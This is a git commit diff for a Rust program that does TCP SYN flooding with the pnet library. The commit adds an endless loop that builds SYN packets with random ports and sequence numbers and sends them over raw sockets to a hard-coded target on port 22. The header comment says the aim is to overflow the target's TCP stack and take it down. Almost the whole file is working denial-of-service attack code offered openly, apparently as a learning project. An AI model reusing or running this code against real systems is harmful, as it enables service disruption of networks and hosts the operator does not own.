354145b8a7eaec1f0c4d16856564d16462bcbc94
Polochon-street <polochonstreet@gmx.fr>
2019-04-16 20:26:41 +0200

    Added an actual loop

--- syn_flooding/src/main.rs
+++ syn_flooding/src/main.rs
@@ -1,3 +1,10 @@
+// This does SYN flooding using the pnet library.
+// Basically, it will flood a target with SYN packets in order
+// to overflow its TCP stack and DoS it. Most new OSes are protected
+// against this by using SYN cookies.
+//
+// Needs root rights to access raw sockets.
+
 extern crate pnet;
 extern crate rand;
 
@@ -13,43 +20,47 @@ use pnet::packet::tcp::ipv4_checksum;
 use pnet::packet::MutablePacket;
 use std::net::Ipv4Addr;
 use std::net::IpAddr;
+use std::{thread, time};
 
 // Static stuff will be changed as args at the end
 static DEST_PORT: u16 = 22;
 static DEST_IP: &str = "192.168.0.33";
 
 fn main() {
-    let mut tcp_buffer = [0u8; 60];
-    let mut tcp_packet = MutableTcpPacket::new(&mut tcp_buffer).unwrap();
-
     let dest_ip = DEST_IP.parse::<Ipv4Addr>().unwrap();
     let source_ip = "192.168.0.3".parse::<Ipv4Addr>().unwrap();
 
-    // Build TCP Packet
-    tcp_packet.set_source(rand::random::<u16>());
-    tcp_packet.set_destination(DEST_PORT);
-    tcp_packet.set_sequence(rand::random::<u32>());
-    tcp_packet.set_acknowledgement(rand::random::<u32>());
-    tcp_packet.set_flags(SYN);
-    tcp_packet.set_window(rand::random::<u16>());
-    tcp_packet.set_checksum(ipv4_checksum(&tcp_packet.to_immutable(), &source_ip, &dest_ip));
-    // Size in 32-bits word : Minimum = 5 (minium header size in bytes = 5 * 4 = 20B)
-    tcp_packet.set_data_offset(5);
-    // tcp_packet.set_payload(String::from("coucou").as_bytes());
+    let sleep_duration = time::Duration::from_millis(500);
 
-    //ip_packet.set_payload(tcp_packet.packet_mut());
+    loop {
+        let mut tcp_buffer = [0u8; 60];
+        let mut tcp_packet = MutableTcpPacket::new(&mut tcp_buffer).unwrap();
+        // Build TCP Packet
+        tcp_packet.set_source(rand::random::<u16>());
+        tcp_packet.set_destination(DEST_PORT);
+        tcp_packet.set_sequence(rand::random::<u32>());
+        tcp_packet.set_acknowledgement(rand::random::<u32>());
+        tcp_packet.set_flags(SYN);
+        tcp_packet.set_window(rand::random::<u16>());
+        tcp_packet.set_checksum(ipv4_checksum(&tcp_packet.to_immutable(), &source_ip, &dest_ip));
+        // Size in 32-bits word : Minimum = 5 (minium header size in bytes = 5 * 4 = 20B)
+        tcp_packet.set_data_offset(5);
+        // tcp_packet.set_payload(String::from("coucou").as_bytes());
 
-    println!("{:?}", tcp_packet);
 
-    let tcp_transport = Layer4(Ipv4(IpNextHeaderProtocols::Tcp));
-    // Largest frame size for Ethernet is 1500
-    let (mut sender, _) = match transport_channel(1500, tcp_transport) {
-        Ok((tx, rx)) => (tx, rx),
-        Err(e) => panic!("Error happened {}", e),
-    };
-    let bytes_sent = sender
-        .send_to(tcp_packet, IpAddr::from(dest_ip))
-        .unwrap();
+        println!("{:?}", tcp_packet);
 
-    print!("Sent {} bytes.", bytes_sent);
+        let tcp_transport = Layer4(Ipv4(IpNextHeaderProtocols::Tcp));
+        // Largest frame size for Ethernet is 1500
+        let (mut sender, _) = match transport_channel(1500, tcp_transport) {
+            Ok((tx, rx)) => (tx, rx),
+            Err(e) => panic!("Error happened {}", e),
+        };
+        let bytes_sent = sender
+            .send_to(tcp_packet, IpAddr::from(dest_ip))
+            .unwrap();
+
+        print!("Sent {} bytes.", bytes_sent);
+        thread::sleep(sleep_duration);
+    }
 }
